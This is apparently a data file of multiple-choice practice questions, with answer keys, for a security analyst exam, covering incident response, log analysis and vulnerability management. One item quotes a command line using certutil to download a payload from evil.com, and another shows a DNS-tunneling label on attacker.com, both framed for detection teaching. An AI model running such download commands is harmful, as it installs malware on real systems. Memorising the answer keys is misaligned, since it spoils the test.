+{q:"Which containment strategy BEST balances stopping attacker access with preserving forensic evidence?",o:["Immediate power-off of all affected systems", "Network isolation — disconnecting systems from network while keeping them powered on to preserve volatile memory", "Immediately reimaging all affected systems", "Blocking the attacker's source IP only"],a:1,d:3,e:"Network isolation removes the attacker's access path (C2 and lateral movement) while preserving volatile evidence. Powering off destroys RAM (running processes, network connections, encryption keys, injected code). Reimaging destroys all evidence. Blocking the source IP only stops that specific channel — attackers often have multiple persistence mechanisms on different infrastructure."},
+{q:"During a tabletop exercise, the team discovers the IR plan doesn't address ransomware attacks on OT systems. This finding should result in:",o:["Noting it as a gap but proceeding", "Updating the IR plan to include OT-specific ransomware playbooks before the next real incident", "Cancelling the exercise", "Immediately purchasing OT security tools"],a:1,d:3,e:"Tabletop exercises exist precisely to find these gaps before real incidents. An IR plan that doesn't cover OT ransomware in an environment with OT systems is a critical gap. The immediate output of a tabletop is an action list of plan updates. This finding should be assigned an owner, given a deadline, and the updated plan retested before being considered complete."},
+{q:"A security analyst must brief the board of directors on the organization's current risk posture. The BEST approach is:",o:["Present all technical vulnerability details and CVE numbers", "Translate technical findings into business risk — financial exposure, operational impact, and strategic recommendations", "Present the number of security tools deployed", "Read from the technical vulnerability assessment report"],a:1,d:4,e:"Boards need business context, not technical details. 'We have 47 critical CVEs' means nothing to a board. 'We have 3 exploitable vulnerabilities in our payment system representing potential $2M regulatory fine and 2-week operational disruption' enables informed decisions. Translate risk into terms that matter to business leaders: money, operations, and reputation."},
+{q:"Which metric BEST demonstrates that a vulnerability management program is improving over time?",o:["Number of vulnerabilities found", "Mean Time to Remediate (MTTR) trend — decreasing MTTR shows the program is getting faster at closing vulnerabilities", "Number of scans conducted", "Budget spent on vulnerability tools"],a:1,d:4,e:"Trending MTTR over time is the strongest program effectiveness indicator. Finding more vulnerabilities just means scanning more (or having more systems). Remediating faster shows the program is operationally improving. Additional supporting metrics: reduction in critical vulnerability age, improvement in patching SLA compliance rates, and reduction in re-discovered vulnerabilities."},
+{q:"After a major security incident, a lessons-learned report should be distributed to:",o:["Only the security team", "All relevant stakeholders including executive leadership, affected business units, IT, legal, and HR — with appropriate detail levels for each audience", "Only executive leadership", "Only the incident responders"],a:1,d:4,e:"Different audiences need different levels of detail. Executives: business impact and strategic improvements. IT/Security: technical root cause and control changes. Business units: process changes affecting them. Legal/HR: if personnel actions or legal obligations resulted. Legal hold considerations may restrict distribution. The report should improve future response — broad distribution with appropriate framing achieves this."},
+{q:"A vulnerability analyst discovers a critical finding in a third-party vendor's software used by the organization. The BEST communication approach is:",o:["Immediately publicly disclose the vulnerability", "Follow responsible disclosure — notify the vendor privately with a reasonable remediation timeline before any public disclosure", "Ignore it — it's the vendor's responsibility", "Notify only internal stakeholders"],a:1,d:4,e:"Responsible/coordinated disclosure: notify the vendor first, provide sufficient detail to reproduce and fix, agree on a disclosure timeline (typically 90 days per Google Project Zero standard), coordinate disclosure of a fix simultaneously. Immediate public disclosure before the vendor can patch harms all users of the software. Ignoring it leaves all users at risk."},
+{q:"Which report type helps executive leadership understand the organization's security posture relative to industry peers?",o:["Technical vulnerability scan report", "Benchmarking report — comparing the organization's metrics against industry standards and peer organizations", "Patch compliance report", "Incident timeline report"],a:1,d:4,e:"Benchmarking provides context for security posture. 'Our MTTR is 45 days' is meaningless without context. 'Our 45-day MTTR is 3x the industry median of 15 days for critical vulnerabilities' enables informed investment decisions. CIS Controls, NIST CSF maturity tiers, and industry-specific benchmarking frameworks provide comparison points."},
+{q:"An analyst must document the chain of custody for digital evidence collected during an incident. This documentation PRIMARILY serves to:",o:["Speed up the investigation", "Prove in legal proceedings that evidence was not tampered with from collection through presentation", "Satisfy audit requirements", "Organize the evidence collection process"],a:1,d:4,e:"Chain of custody proves legal admissibility. Every person who handled evidence, every transfer, every analysis step must be documented. Cryptographic hashing proves integrity. If evidence was not properly documented, defense attorneys can successfully argue it was contaminated or altered — making it inadmissible. For any incident that may result in prosecution, CoC is critical from the first moment of collection."},
+{q:"Which security metric measures how quickly an organization's security team detects an ongoing intrusion?",o:["Patch coverage rate", "MTTD — Mean Time to Detect, measuring the gap between initial compromise and security team awareness", "Number of alerts processed", "Vulnerability count"],a:1,d:4,e:"MTTD measures detection speed — the average time from when an attacker first gained access to when the security team became aware. Global average MTTD has historically been 200+ days for advanced threats. Reducing MTTD directly limits attacker dwell time and breach impact. MTTD is tracked alongside MTTR (time to respond/contain) as the core IR effectiveness metrics."},
+{q:"A company must notify regulators of a data breach. The FIRST step in preparing the notification is:",o:["Writing the notification letter", "Consulting legal counsel to determine notification obligations, timelines, and content requirements based on applicable regulations", "Notifying affected customers", "Holding a press conference"],a:1,d:4,e:"Legal counsel determines: which regulations apply (GDPR, HIPAA, state laws, sector-specific), what the notification must contain, to whom notification is required (regulators, affected individuals), and deadlines (GDPR: 72 hours to supervisory authority). Writing the notification before understanding legal requirements risks incomplete or non-compliant notification, creating additional legal exposure."},
+{q:"Which vulnerability report format is MOST appropriate for communicating findings to developers who will fix the issues?",o:["Executive summary with risk ratings only", "Technical report with reproduction steps, vulnerable code snippets, and recommended code-level remediation — giving developers what they need to fix it", "Compliance checklist", "CVE reference list only"],a:1,d:4,e:"Developers need actionable technical detail: exact location of the vulnerability, reproduction steps, root cause analysis, and specific remediation guidance (parameterize this query, validate this input, etc.). Without this, developers spend time independently finding what was already found during assessment. Technical reports accelerate developer remediation."},
+{q:"An analyst must communicate to management that the organization's most critical vulnerability cannot be patched for 30 days due to application dependencies. The COMMUNICATION should include:",o:["Only the vulnerability technical details", "The business risk of the delay, compensating controls implemented to reduce exposure during the window, and approval request from the risk owner", "Only that the patch is delayed", "Only the compensating controls without mentioning the delay"],a:1,d:4,e:"Risk communication must include: what the risk is (business terms), why it exists (dependency issue), what's being done to mitigate it during the window (compensating controls), and what decision is needed (risk acceptance approval from the appropriate authority). This gives management the information needed to make an informed risk decision."},
+{q:"Which Windows event ID indicates a user account was successfully logged on?",o:["4624", "4625", "4648", "4720"],a:0,d:1,e:"Event ID 4624 is a successful logon. 4625 is a failed logon. 4648 is logon using explicit credentials (e.g., runas). 4720 is user account creation. Monitoring 4624 with unusual source IPs, times, or logon types (Type 3 = network) is foundational for detecting credential-based attacks."},
+{q:"A SOC analyst sees a spike in Event ID 4625 (failed logon) across 50 accounts from one IP in 5 minutes, followed by a single 4624 (success). This sequence indicates:",o:["Normal user error", "A successful password spray attack — spray failed on most accounts but succeeded on one", "A brute force on one account", "Normal network authentication"],a:1,d:1,e:"Password spray: many accounts, few attempts each. The success after many failures across different accounts confirms one credential worked. Immediate response: disable the compromised account, investigate what the attacker accessed, reset the password, and analyze which account was hit — it likely had a weak or common password."},
+{q:"Which log analysis technique identifies statistical outliers by comparing current patterns to historical baselines?",o:["Signature matching — matching against known bad patterns", "Anomaly detection — flagging deviations from established behavioral baselines", "Keyword searching", "Log aggregation"],a:1,d:1,e:"Anomaly detection is baseline-driven. The system learns normal patterns (typical login times, typical data volumes, typical process trees) and flags statistical deviations. This catches novel attacks that have no signatures. Limitation: high false positive rate during initial baselining period."},
+{q:"An analyst is investigating a potential insider threat. Which data source BEST shows what files a user copied to external media?",o:["Authentication logs", "DLP solution logs combined with USB connection artifacts (USBSTOR registry, Windows Event Log 2003/2004/2005)", "Firewall logs", "Email logs"],a:1,d:1,e:"DLP (Data Loss Prevention) solutions monitor and log data movement including USB transfers. Windows events 2003/2004/2005 in the Microsoft-Windows-DriverFrameworks-UserMode log track USB device connection and disconnection. Combining DLP with USB artifacts builds a complete picture of what was transferred to which device at what time."},
+{q:"Which threat hunting technique starts with a specific hypothesis about attacker behavior rather than searching broadly?",o:["Reactive hunting — responding to alerts", "Hypothesis-driven hunting — testing specific theories about attacker TTPs based on threat intelligence", "Machine learning-based hunting", "Signature scanning"],a:1,d:1,e:"Hypothesis-driven hunting starts with a specific theory: 'Attackers targeting our industry use WMI for persistence — let me hunt for WMI event subscriptions.' This focused approach is more efficient than broad hunting and leverages threat intelligence about relevant threat actors and their TTPs."},
+{q:"A process is observed making a DNS query for a domain that was registered 2 days ago and has never been queried by this organization. The domain resolves to an IP in a bulletproof hosting network. This is MOST consistent with:",o:["Legitimate new SaaS application usage", "C2 infrastructure — attackers register fresh domains to avoid blocklists", "CDN traffic", "Update server traffic"],a:1,d:1,e:"Attackers register new domains specifically to avoid threat intelligence blocklists that only catch known-bad domains. Domain age combined with bulletproof hosting (hosting providers that ignore abuse complaints) and unexpected resolution from an internal host is a high-confidence C2 indicator. Threat hunting should pivot from this domain to the connecting process."},
+{q:"Which artifact persists on Windows systems after an application is uninstalled and records historical software execution?",o:["Windows registry Run keys", "Shimcache/AppCompatCache — records metadata about executed files even after deletion", "Prefetch files only", "Event logs only"],a:1,d:1,e:"Shimcache (Application Compatibility Cache) records file path, size, and last modification time for executables that were run. Critically, entries persist even after the file is deleted, providing forensic evidence of past execution. Analysts examine shimcache to prove that malware was run even after cleanup. Located at HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache."},
+{q:"A new alert rule fires 800 times in 24 hours but only 2 are true positives. The analyst should:",o:["Accept the noise as necessary", "Tune the rule — add exclusions for known-good sources and increase threshold specificity to reduce false positives", "Disable the rule", "Escalate all 800 to incident status"],a:1,d:1,e:"A 0.25% true positive rate makes the rule operationally useless — analysts will start ignoring it, creating alert fatigue. Rule tuning: add whitelist conditions (known IPs, known process paths), increase threshold (require 10 events instead of 1), add correlated conditions (require failed auth + lateral movement + suspicious process simultaneously). Quality over quantity."},
+{q:"Which network traffic characteristic is MOST useful for identifying encrypted C2 traffic that mimics legitimate HTTPS?",o:["Packet size", "JA3/JA3S TLS fingerprinting — identifies TLS client/server implementations regardless of certificate validity", "Port numbers", "Protocol version"],a:1,d:1,e:"JA3 hashes TLS client hello parameters (cipher suites, extensions, elliptic curves) to create a fingerprint of the TLS implementation. Many malware families have distinctive JA3 fingerprints that persist even when they rotate domains and IPs. JA3S fingerprints the server response. Matching JA3 against known-bad fingerprints catches C2 traffic disguised as legitimate HTTPS."},
+{q:"Which technique allows malware to execute code without writing any files to disk?",o:["Registry persistence", "Fileless malware — executing code in memory (PowerShell, WMI, or reflective DLL injection) without disk artifacts", "Boot sector infection", "Service installation"],a:1,d:1,e:"Fileless malware lives entirely in memory, using built-in system tools (PowerShell, WMI, .NET) or injecting code into legitimate processes. Traditional AV that scans files cannot detect it. EDR solutions with memory scanning, behavior monitoring, and script-block logging (PowerShell 5.0+) are required. Memory forensics (RAM dump analysis) is the primary forensic technique."},
+{q:"An analyst notices base64-encoded PowerShell commands in event logs. This is significant because:",o:["Base64 is a security feature of PowerShell", "Base64 encoding is commonly used to obfuscate malicious PowerShell — hiding payloads from signature detection", "It indicates a software update", "Base64 indicates encrypted communications"],a:1,d:1,e:"Attackers encode PowerShell commands to evade detection: 'powershell.exe -EncodedCommand <base64>'. The encoded payload might download malware, disable defenses, or execute further stages. PowerShell Script Block Logging (Event ID 4104) decodes and logs the actual commands executed, defeating this obfuscation. Analysts should decode and analyze any encoded PowerShell."},
+{q:"Which kill chain phase does a spear-phishing email represent?",o:["Weaponization", "Delivery — the mechanism of delivering the weaponized payload to the target", "Exploitation", "Installation"],a:1,d:1,e:"Lockheed Martin Kill Chain: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives. Spear-phishing is the Delivery phase — the mechanism for getting the weaponized payload (malicious attachment or link) to the target. Understanding which phase an indicator belongs to helps analysts understand how far into an attack the adversary has progressed."},
+{q:"A web proxy log shows hundreds of HTTP requests with identical User-Agent strings to a single external IP at regular 30-second intervals. This MOST likely indicates:",o:["Normal web browsing", "Malware beaconing — malware checking in with C2 at regular intervals using a consistent User-Agent", "A software update process", "A load balancer health check"],a:1,d:1,e:"Regular-interval requests from a single host to a single external IP with a programmatic (non-browser) User-Agent is a classic beaconing pattern. Legitimate browser traffic is irregular in timing. The single-IP destination rules out CDN/distributed services. 30-second regularity is consistent with malware poll intervals. Investigate the host immediately."},
+{q:"Which MITRE ATT&CK tactic describes actions taken by an attacker after initial access to maintain presence in the environment?",o:["Initial Access", "Persistence — techniques ensuring the attacker can maintain access even after reboots or credential changes", "Privilege Escalation", "Discovery"],a:1,d:1,e:"ATT&CK Persistence tactic (TA0003) includes: Registry Run Keys, Scheduled Tasks, Services, WMI event subscriptions, Boot/Logon Autostart, Browser Extensions, and Account Manipulation. After initial compromise, establishing persistence is one of the attacker's first priorities. Hunting for new persistence mechanisms is a high-value detection opportunity."},
+{q:"Which data source provides the BEST visibility into lateral movement using Windows Remote Management (WinRM)?",o:["Network flow logs showing port 5985/5986 connections", "Windows Event logs (4624 type 3/10, PowerShell remoting events) combined with WinRM service logs", "Firewall ACL logs", "DNS query logs"],a:1,d:1,e:"WinRM lateral movement: Windows Event 4624 Logon Type 3 (network logon) on the destination, PowerShell remoting events (Event ID 4103/4104), and WinRM service events on both source and destination. Network flow logs show 5985 connections. Correlating these sources confirms which user authenticated from which source to which destination — the full lateral movement picture."},
+{q:"An endpoint has a process named 'explorer.exe' running from 'C:\\Users\\Public\\' with PPID of 4 (System). This is suspicious because:",o:["Explorer always runs from Public", "Legitimate explorer.exe runs from C:\\Windows\\ and is spawned by userinit.exe, not System", "Explorer should run as PPID 4", "This is normal remote session behavior"],a:1,d:1,e:"Masquerading (T1036): attackers copy malware to common paths and name it after legitimate processes. Legitimate explorer.exe: path is C:\\Windows\\explorer.exe, parent process is userinit.exe or winlogon.exe. PPID of 4 (System) is abnormal. Path in C:\\Users\\Public\\ is abnormal. Both anomalies together confirm this is malware, not explorer."},
+{q:"Which technique does an attacker use to extract password hashes from memory on a Windows system?",o:["Keylogging", "LSASS memory dumping — using tools like Mimikatz to extract credentials from lsass.exe process memory", "Registry key theft", "Network sniffing"],a:1,d:1,e:"LSASS (Local Security Authority Subsystem Service) stores credential material in memory including NTLM hashes and Kerberos tickets. Mimikatz and similar tools dump LSASS memory to extract these credentials. Detections: Event ID 4656 (handle request to lsass), Event ID 10 in Sysmon (process access to lsass), EDR alerts on credential dumping behavior. Windows Credential Guard moves secrets to a protected VM, preventing this."},
+{q:"Which DNS query type is used for command and control exfiltration where data is hidden in subdomain labels?",o:["A record queries", "TXT record queries with base64 data in unusually long subdomain labels — a DNS tunneling indicator", "MX record queries", "PTR record queries"],a:1,d:1,e:"DNS tunneling encodes data in DNS query labels: 'ZGF0YXRvZXhmaWx0cmF0ZQ.attacker.com'. The data-to-exfiltrate becomes the subdomain. The attacker's DNS server receives the queries and decodes the data. Indicators: long subdomain labels (>50 chars), high query frequency, TXT responses larger than normal, data patterns in subdomains. Tools like dnscat2 and iodine implement DNS tunneling."},
+{q:"A threat intelligence report indicates a threat actor uses a custom Python backdoor that communicates over TCP 443 but does NOT use TLS. How would an analyst detect this?",o:["Block all port 443 traffic", "Inspect traffic patterns — legitimate HTTPS starts with a TLS ClientHello; raw TCP on 443 without TLS negotiation is anomalous", "Only check firewall logs", "Use port-based blocking only"],a:1,d:1,e:"Content inspection vs port inspection: firewalls see port 443 and assume HTTPS. An analyst examining packet captures or IDS signatures can verify whether actual TLS handshake occurs. Plain TCP on port 443 without TLS negotiation is highly anomalous — all legitimate HTTPS traffic starts with TLS ClientHello. This protocol anomaly is detectable by deep packet inspection or network monitoring tools."},
+{q:"Which SIEM correlation rule would MOST effectively detect a brute force attack followed by account compromise?",o:["Alert on any failed login", "Correlate: >20 failed logins from one source to one account within 5 minutes, followed by a successful login from the same source within 10 minutes", "Alert on successful logins only", "Alert on all authentication events"],a:1,d:1,e:"The correlation rule combines two events: the attack pattern (many failures) with the success indicator (compromise). Simple rules alert on either event alone generating noise. Correlated rules require both conditions in sequence, creating high-fidelity alerts with minimal false positives. The time window (success within 10 min of the spray) establishes causal relationship."},
+{q:"Which tool would an analyst use to analyze network traffic captured in a PCAP file?",o:["Nessus", "Wireshark — the industry-standard packet analysis tool for dissecting network protocols", "Metasploit", "Nmap"],a:1,d:1,e:"Wireshark decodes network protocols from raw PCAP captures, displaying packet fields at every OSI layer. Analysts use it to: reconstruct sessions (Follow TCP Stream), export transferred files (Export Objects), analyze protocol details, identify anomalies, and extract IOCs. tcpdump creates PCAPs from the command line; Wireshark analyzes them. Both are fundamental SOC analyst tools."},
+{q:"Which type of threat actor is MOST likely to use zero-day exploits and custom malware while maintaining persistent access for months without detection?",o:["Script kiddie", "APT (Advanced Persistent Threat) — nation-state or state-sponsored actors with advanced capabilities and long-term objectives", "Hacktivist", "Opportunistic criminal"],a:1,d:1,e:"APTs combine: zero-day exploits (expensive, custom), custom malware (not in signature databases), patient long-term access (months to years), specific high-value targets, and significant resources. They prioritize stealth over speed. Nation-state APTs targeting government and critical infrastructure exemplify this. Their long dwell time (often 200+ days before detection) demonstrates their evasion capability."},
+{q:"An analyst reviewing Sysmon logs sees Event ID 1 (Process Create) with: ParentImage: C:\\Windows\\System32\\wscript.exe, Image: C:\\Windows\\System32\\cmd.exe, CommandLine: 'cmd.exe /c certutil -urlcache -f http://evil.com/payload.exe %TEMP%\\payload.exe'. What happened?",o:["Normal Windows scripting", "A script (VBScript/JScript) launched cmd.exe which used certutil to download malware — a living-off-the-land attack", "A software installation", "Windows update activity"],a:1,d:1,e:"The process chain: wscript.exe (script interpreter) → cmd.exe → certutil (download malware). This is a classic LOTL attack: wscript runs a malicious script, cmd provides shell access, certutil (legitimate Windows tool) downloads the payload. No malicious binaries are used until the final download. Sysmon Event ID 1 with parent-child process tracking is essential for detecting this chain."},
+{q:"Which security operations function ensures that threat detection rules remain current as threats evolve?",o:["Compliance auditing", "Detection engineering — continuously developing, testing, and maintaining detection content aligned with current threats", "Vulnerability scanning", "Asset inventory management"],a:1,d:1,e:"Detection engineering is an ongoing discipline: new attack techniques emerge constantly, existing rules generate false positives, and environments change. Detection engineers translate threat intelligence into SIEM/EDR rules, test them with simulated attacks, measure their effectiveness, and retire obsolete rules. Without continuous maintenance, detection capability degrades relative to evolving threats."},
+{q:"A host suddenly begins resolving 50-100 different unique domain names per minute, most of which fail to resolve (NXDOMAIN). This indicates:",o:["Normal antivirus update behavior", "Domain Generation Algorithm (DGA) activity — malware generating random domains to find its C2 server", "DNS server failure", "Normal web browsing"],a:1,d:1,e:"DGA malware generates pseudo-random domain names and tries to contact each until one resolves to the C2 server. The attacker pre-registers just one of the generated domains. The flood of NXDOMAIN responses for random-looking domains is the signature. Tools like DGArchive and CISCO's DGA detection can identify DGA patterns. Once identified, analysts can predict future domains and preemptively block or sinkhole them."},
+{q:"Which CVSS v3 metric describes how easily an attacker can exploit the vulnerability from a network perspective?",o:["Attack Complexity (AC)", "Attack Vector (AV) — Network means exploitable remotely, Local means requires physical/local access", "Privileges Required (PR)", "User Interaction (UI)"],a:1,d:2,e:"Attack Vector (AV) in CVSS v3: Network (N) = exploitable remotely over internet (highest severity), Adjacent (A) = requires same local network, Local (L) = requires local access, Physical (P) = requires physical interaction. Network-vectored vulnerabilities are most critical — they're reachable by every attacker on the internet without any access prerequisites."},
+{q:"An organization uses a container platform. Which vulnerability management challenge is UNIQUE to containerized environments?",o:["Containers don't have vulnerabilities", "Container images are immutable but may be built from vulnerable base images — vulnerabilities spread to all containers using that image", "Container vulnerabilities cannot be patched", "Container scanning is impossible"],a:1,d:2,e:"Container image vulnerabilities propagate instantly — if the base image (e.g., Ubuntu:20.04) has a vulnerability, ALL containers built from it inherit it. Traditional agent-based scanners can't run inside containers. Container-specific scanning (Trivy, Clair, Anchore) scans image layers before deployment. Shift-left scanning in CI/CD pipelines catches vulnerabilities before images reach production."},
+{q:"CISA's Known Exploited Vulnerabilities (KEV) catalog is MOST valuable for vulnerability prioritization because:",o:["It lists all CVEs", "It identifies vulnerabilities with confirmed active exploitation in the wild — the highest-priority remediation targets", "It provides CVSS scores", "It lists vendor patches"],a:1,d:2,e:"CISA KEV contains only vulnerabilities with confirmed real-world exploitation. Being on KEV means attackers are actively using this vulnerability right now against real organizations. CISA mandates federal agencies patch KEV entries within 2-3 weeks. Private organizations should treat KEV as highest-priority regardless of CVSS score. A CVSS 7.0 on KEV is higher priority than a CVSS 9.8 with no known exploitation."},
+{q:"A vulnerability scan identifies a critical SQL injection flaw in a legacy application that cannot be patched for 6 months. The BEST compensating control is:",o:["Accept the risk without controls", "Deploy a WAF with SQL injection rules, restrict access to the application, and increase monitoring — while documenting the exception", "Ignore until patch is available", "Shut down the application"],a:1,d:2,e:"When patching is impossible, compensating controls reduce risk during the window: WAF filters SQL injection attempts at the network layer, access restrictions limit who can reach the vulnerable application, monitoring detects exploitation attempts. All of this is documented in a formal risk exception with owner sign-off and a remediation timeline. The compensating controls must be as effective as patching would be."},
+{q:"Which vulnerability management process converts raw scanner output into a prioritized remediation plan?",o:["Scanning", "Analysis and prioritization — reviewing findings, removing false positives, adding context, and ordering by risk", "Reporting", "Patch deployment"],a:1,d:2,e:"Raw scanner output is not a remediation plan. Analysis adds: false positive removal (confirmed non-issues), asset context (production vs. dev), exploitability assessment (KEV? public PoC?), business impact, and compensating controls already in place. The output is an ordered, actionable list that the remediation team can execute without further triage."},
+{q:"A security team uses EPSS (Exploit Prediction Scoring System) alongside CVSS. EPSS provides:",o:["A replacement for CVSS", "Probability that a vulnerability will be exploited in the next 30 days — helping prioritize based on actual exploitation likelihood", "Severity of the vulnerability if exploited", "Vendor patch priority"],a:1,d:2,e:"EPSS (maintained by FIRST) uses machine learning to predict the probability a CVE will be exploited within 30 days, based on factors like public exploit code availability, attacker interest, and historical patterns. Combining CVSS (technical severity) with EPSS (exploitation likelihood) creates better risk-based prioritization than CVSS alone. A high-EPSS/medium-CVSS vulnerability may need patching before a low-EPSS/critical-CVSS one."},
+{q:"Which scanning approach is MOST effective for identifying vulnerabilities in web applications that aren't found by network scanners?",o:["Network vulnerability scanner", "DAST (Dynamic Application Security Testing) — testing running web applications by sending crafted inputs", "Host-based scanner", "Port scanner only"],a:1,d:2,e:"DAST (e.g., OWASP ZAP, Burp Suite) tests web applications by interacting with them as an attacker would: sending malicious inputs, manipulating parameters, testing authentication flows. Network scanners see what ports/services are open; DAST finds application-layer issues (SQLi, XSS, SSRF, broken authentication) that only emerge through application interaction. SAST analyzes source code; DAST tests running applications."},
+{q:"An analyst discovers an S3 bucket containing customer PII is publicly accessible. This is classified as which type of vulnerability?",o:["Network vulnerability", "Cloud misconfiguration — a configuration error rather than a software flaw", "Application vulnerability", "Zero-day"],a:1,d:2,e:"Cloud misconfigurations are the leading cause of cloud data breaches. S3 public access, overpermissive IAM policies, unencrypted storage, and exposed management interfaces are misconfigurations, not software vulnerabilities — there's no CVE, no patch. Remediation is configuration correction (enable Block Public Access, review bucket policy). CSPM tools continuously detect these misconfigurations."},
+{q:"A vulnerability was discovered in an open-source library used by 200 different applications in the organization. This is BEST described as:",o:["An isolated application vulnerability", "A software supply chain vulnerability — one vulnerable dependency affects all applications using it", "A network vulnerability", "A configuration vulnerability"],a:1,d:2,e:"Software supply chain vulnerabilities (like Log4Shell in Log4j) cascade across every application using the vulnerable dependency. Organizations often don't know which apps use which libraries — software composition analysis (SCA) tools map these dependencies. The challenge: 200 separate remediation efforts each requiring their own testing and deployment cycle."},
+{q:"Which vulnerability management metric measures the percentage of discovered vulnerabilities that have been remediated within the SLA?",o:["Vulnerability count", "Patch compliance rate / SLA adherence rate — measuring remediation effectiveness against defined timelines", "MTTR", "CVE coverage"],a:1,d:2,e:"SLA adherence rate measures whether the vulnerability management program meets its own commitments: critical vulnerabilities patched within 7 days, high within 30 days, etc. This metric demonstrates operational effectiveness to stakeholders and identifies bottlenecks (is IT missing SLAs for specific asset types?). Low SLA adherence indicates process problems requiring remediation, not just more scanning."},
+{q:"Which technology provides continuous, real-time vulnerability status rather than point-in-time scan snapshots?",o:["Annual vulnerability assessment", "Continuous vulnerability management using agent-based scanning and CSPM — providing always-current visibility", "Quarterly penetration testing", "Monthly scanning"],a:1,d:2,e:"Agent-based scanners (Tenable Nessus Agent, Qualys Cloud Agent) continuously monitor endpoint state and report changes in real time. CSPM continuously monitors cloud environments. This eliminates the 'scan gap' where vulnerabilities are introduced between scans and remain invisible for weeks. Continuous visibility is especially important in dynamic cloud environments where infrastructure changes constantly."},
+{q:"An application has a buffer overflow vulnerability. The FIRST remediation step should be:",o:["Deploy IPS signatures", "Apply the vendor patch — fixing the root cause in the code", "Enable ASLR", "Add a WAF"],a:1,d:2,e:"Code-level fixes are always the primary remediation. Vendor patches fix the vulnerable code, eliminating the root cause. ASLR, DEP, and IPS signatures are compensating controls that make exploitation harder but don't fix the underlying vulnerability. A sophisticated attacker may bypass ASLR or craft exploits that evade IPS signatures; the patch eliminates the possibility entirely."},
+{q:"Which attack surface management activity discovers internet-exposed assets that the security team didn't know about?",o:["Internal vulnerability scanning", "External attack surface management (EASM) — continuously discovering and monitoring internet-facing assets", "Compliance auditing", "Penetration testing"],a:1,d:2,e:"EASM discovers shadow IT, forgotten assets, and subsidiary infrastructure that internal teams may not know is exposed. Attackers perform this same reconnaissance — EASM gives defenders an attacker-eye view of their exposure. Discovered assets are then assessed for vulnerabilities and either remediated or decommissioned. This is increasingly important as cloud makes it easy to accidentally expose resources."},
+{q:"A vendor releases a security advisory for a critical vulnerability but has not yet released a patch. The organization should:",o:["Wait for the patch", "Apply vendor-recommended mitigations immediately (e.g., disable the feature, restrict access), increase monitoring, and apply the patch as soon as it's available", "Accept the risk and do nothing", "Completely shut down the affected system"],a:1,d:2,e:"Vendor advisories often include temporary mitigations even before patches are available: disabling vulnerable features, restricting access to trusted IPs, adding authentication requirements, or configuration changes. These reduce attack surface during the patch gap. Monitoring for exploitation attempts should also increase. The formal patch should be applied as soon as it's tested and available."},
+{q:"Which document defines the maximum allowable time between vulnerability scans for PCI DSS compliance?",o:["ISO 27001", "PCI DSS Requirement 11.3 — requires internal vulnerability scanning at least quarterly and after network changes", "NIST 800-53", "SOC 2"],a:1,d:2,e:"PCI DSS Requirement 11.3 mandates: internal vulnerability scans at least quarterly (and after significant changes), external scans quarterly by an Approved Scanning Vendor (ASV). After a failed scan, rescan until passing. This is one of the most prescriptive vulnerability scanning requirements in any compliance framework. Missing quarterly scans is a PCI DSS finding."},
+{q:"An analyst discovers a vulnerability has a CVSS 3.1 base score of 6.5 but has been modified with a temporal score of 4.2. The temporal reduction reflects:",o:["A change in the vulnerability itself", "Availability of official vendor mitigations or patches that reduce real-world risk — temporal metrics adjust base scores based on current exploitation factors", "A change in the target environment", "A lower CVE number"],a:1,d:2,e:"CVSS temporal metrics adjust the base score for current real-world factors: Exploit Code Maturity (is there working exploit code?), Remediation Level (official patch, workaround, or nothing?), and Report Confidence (confirmed or unconfirmed?). An official patch available (Remediation Level = Official Fix) reduces the temporal score significantly because the risk can be eliminated by patching."},
+{q:"Which vulnerability affects virtually all applications using a specific version of a shared library and requires coordinated response across many systems?",o:["Local privilege escalation", "Transitive/dependency vulnerability — a flaw in a widely-used library that affects all software depending on it", "Web application XSS", "Network protocol vulnerability"],a:1,d:2,e:"Transitive vulnerabilities in widely-used libraries (OpenSSL, Log4j, Spring Framework) require coordinated response. Every application using the affected library must be inventoried, updated, and tested separately. SCA tools (Snyk, Black Duck, OWASP Dependency Check) identify these dependencies. The response challenge is organizational: getting 50+ application teams to prioritize patching simultaneously."},
+{q:"What is the PRIMARY benefit of integrating vulnerability management with the change management process?",o:["Faster scanning", "Ensuring new vulnerabilities introduced by changes are immediately scanned and that high-risk changes require security review", "Automatic patching", "Compliance reporting"],a:1,d:2,e:"Change management integration prevents 'scan gap' — when a change introduces a vulnerability, it's detected immediately because the change triggers a rescan. Security review of high-risk changes (firewall rule additions, new internet-facing services) prevents vulnerabilities from being introduced. Patching as part of change management ensures changes don't re-introduce patched vulnerabilities."},
+{q:"An organization discovers a critical vulnerability in an OT/ICS system that controls physical processes. Patching immediately may cause system downtime. The BEST approach is:",o:["Patch immediately regardless of impact", "Coordinate with OT engineers to schedule patching during a planned maintenance window, apply compensating controls immediately, and monitor closely", "Accept the risk indefinitely", "Shut down the OT system"],a:1,d:2,e:"OT/ICS systems require special consideration — unplanned downtime can affect physical processes, safety, or production. Compensating controls (network isolation, additional monitoring, access restrictions) reduce risk during the patch window. Coordinated patching with OT engineers during planned maintenance minimizes business impact while addressing the vulnerability. Never patch OT systems without OT team coordination."},
+{q:"Which metric indicates the total potential financial impact of a vulnerability if successfully exploited?",o:["CVSS score", "Business impact analysis combining asset value, data sensitivity, regulatory exposure, and operational disruption — the 'so what if exploited?' calculation", "Vulnerability age", "EPSS score"],a:1,d:2,e:"Business impact quantifies what actually matters: if this vulnerability is exploited, what does it cost? Factors: data breach cost (records × per-record cost), regulatory fines (GDPR, HIPAA), operational disruption (downtime × revenue/hour), remediation costs, reputational damage. A CVSS 9.8 on a test server with no sensitive data has lower business impact than a CVSS 7.0 on the payment processing system."},
+{q:"Which NIST SP 800-61 incident response phase involves activities to reduce risk and improve defenses after an incident?",o:["Detection and Analysis", "Containment, Eradication, and Recovery", "Post-Incident Activity — lessons learned, policy updates, and control improvements", "Preparation"],a:2,d:3,e:"NIST SP 800-61 IR phases: Preparation → Detection and Analysis → Containment, Eradication, and Recovery → Post-Incident Activity. Post-incident activity includes: lessons-learned meetings, updating IR plans, improving detection capabilities, implementing missing controls, and reporting to leadership. This phase converts the incident into security improvements that prevent recurrence."},
